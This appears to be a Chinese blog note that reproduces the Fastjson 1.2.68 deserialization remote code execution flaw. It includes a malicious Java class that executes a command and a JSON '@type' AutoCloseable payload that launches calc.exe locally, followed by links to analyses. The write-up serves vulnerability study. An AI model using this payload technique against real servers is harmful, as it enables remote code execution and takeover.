FastJson 反序列化漏洞



**Fastjson <=1.2.68版本存在远程代码执行漏洞**，漏洞被利用可直接获取服务器权限



[腾讯云公告](https://cloud.tencent.com/announce/detail/1112)





[漏洞分析1](https://xz.aliyun.com/t/7878)

[漏洞分析2](https://www.anquanke.com/post/id/208104)

[漏洞分析利用](https://blog.csdn.net/god_zzZ/article/details/107122487)

[漏洞阅读](https://github.com/LeadroyaL/fastjson-blacklist)

[fastjson 处理流程](https://paper.seebug.org/994/)

[历史漏洞](http://xxlegend.com/)

![image-20200706172438656](http://img.zhangqingdong.cn/image-20200706172438656.png)

> 问题复现：

先来一个简单的，A/B/C 是同一个地址： 而且恶意程序也只是在攻击者自己的地址调起一个计算器

```xml
<!--添加fastjson依赖-->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.68</version>
</dependency>
```

```java
package com.ronhan.controller.security;

import java.io.IOException;

/**
 * 构造的恶意class程序，用于执行本地的一个程序
 *
 * @author qingdong.zhang
 * @version 1.0
 * @since 2020-07-06 17:13
 */
public class A implements AutoCloseable{

    public A(String cmd){
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void close() throws Exception {

    }
}
```

```java
package com.ronhan.controller.security;

import com.alibaba.fastjson.JSON;

/**
 * 构造的payload 及 模拟执行
 *
 * @author qingdong.zhang
 * @version 1.0
 * @since 2020-07-06 17:13
 */
public class FastJsonTest {

    public static void main(String[] args) {

        String payload = "{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.ronhan.controller.security.A\", \"cmd\":\"calc.exe\"}";
        JSON.parseObject(payload);

    }
}
```



成功弹出计算器

![image-20200706172930135](http://img.zhangqingdong.cn/image-20200706172930135.png)



> 尝试分析为什么会执行了一个calc.exe





